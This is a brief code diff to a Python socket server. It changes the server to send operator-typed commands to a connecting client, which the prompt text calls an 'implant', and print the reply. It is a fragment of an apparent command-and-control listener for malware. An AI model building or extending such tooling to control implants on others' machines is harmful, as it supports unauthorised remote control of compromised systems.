@@ -10,6 +10,7 @@ s.listen(5)  # Now wait for client connection
 while True:
     c, addr = s.accept()  # Establish connection with client
     print(f"Connection from {addr} has been established.")
-    c.send(b"sql select*")
+    message = input("Press Enter to command the implant")
+    c.send(message.encode())
     print(c.recv(1024))
     c.close()  # Close the connection
